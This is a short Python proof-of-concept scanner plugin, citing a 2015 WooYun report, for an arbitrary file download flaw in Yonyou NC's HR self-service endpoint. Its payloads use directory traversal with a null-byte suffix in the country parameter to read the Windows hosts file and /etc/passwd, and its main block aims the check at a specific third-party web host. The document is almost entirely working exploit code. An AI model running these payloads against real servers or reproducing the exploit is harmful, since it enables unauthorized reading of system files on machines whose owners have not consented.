#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name:  用友 country 和 language字段任意文件下载
Author  :  a
mail    :  a@lcx.cc
Referer :http://www.wooyun.org/bugs/wooyun-2015-096676
"""

def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg


def audit(arg):
    payloads = [
        '/hrss/dorado/smartweb2.loadConst.d?language=zh&country=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.html' ,
	'/hrss/dorado/smartweb2.loadConst.d?language=zh&country=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00.html'     
        ]
	
    for payload in payloads:	
        url = arg + payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)      
        if code == 200 and "const.js" in head:
            security_hole(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc','http://www.jumbohr.cn:8088/')[1])
